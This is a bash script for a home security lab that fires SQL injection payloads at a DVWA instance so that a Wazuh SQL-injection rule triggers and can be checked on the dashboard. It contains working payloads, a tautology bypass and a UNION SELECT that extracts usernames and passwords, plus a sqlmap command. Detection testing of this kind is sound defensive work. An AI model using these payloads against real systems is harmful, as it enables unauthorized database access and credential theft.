#!/usr/bin/env bash

set -euo pipefail

VICTIM_IP="${1:?Usage: $0 <victim-ip> [dvwa-cookie]}"
COOKIE="${2:-PHPSESSID=REPLACE_ME; security=low}"
BASE_URL="http://${VICTIM_IP}/dvwa/vulnerabilities/sqli/"

echo "[*] Target   : $BASE_URL"
echo "[*] This will trigger Wazuh rule 100020 (Possible SQL Injection)."
echo

echo "[1/3] Manual payload — tautology-based bypass"
curl -s -G "$BASE_URL" \
  --data-urlencode "id=1' OR '1'='1" \
  --data-urlencode "Submit=Submit" \
  -H "Cookie: $COOKIE" -o /dev/null -w "  -> HTTP %{http_code}\n"

echo "[2/3] Manual payload — UNION SELECT enumeration"
curl -s -G "$BASE_URL" \
  --data-urlencode "id=1 UNION SELECT user, password FROM users-- -" \
  --data-urlencode "Submit=Submit" \
  -H "Cookie: $COOKIE" -o /dev/null -w "  -> HTTP %{http_code}\n"

echo "[3/3] Automated sweep with sqlmap (optional, more thorough)"
echo "      Uncomment the line below once your cookie is set correctly:"
echo "      sqlmap -u \"${BASE_URL}?id=1&Submit=Submit\" --cookie=\"$COOKIE\" --batch --level=2"

echo
echo "[*] Done. Check the Wazuh dashboard -> Security Events, filter rule.id:100020"
